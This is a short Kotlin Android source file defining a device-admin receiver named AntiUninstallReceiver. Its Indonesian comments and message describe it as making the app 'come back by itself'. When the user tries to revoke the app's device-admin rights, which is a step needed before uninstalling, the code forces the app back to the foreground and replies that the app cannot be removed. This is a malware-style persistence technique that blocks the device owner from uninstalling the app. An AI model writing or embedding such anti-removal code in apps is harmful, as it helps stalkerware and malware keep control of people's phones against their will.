package com.sync.xxx

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

class AntiUninstallReceiver : DeviceAdminReceiver() {
    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        // Langsung re-launch app ke foreground — efek "balik sendiri"
        val launch = context.packageManager
            .getLaunchIntentForPackage(context.packageName)?.apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
        if (launch != null) {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
        val pending = android.app.PendingIntent.getActivity(
            context, 0, launch,
            android.app.PendingIntent.FLAG_IMMUTABLE or android.app.PendingIntent.FLAG_UPDATE_CURRENT
        )
        pending.send()
    } else {
        context.startActivity(launch)
    }
}
        return "Aplikasi ini tidak dapat dihapus."
    }
}
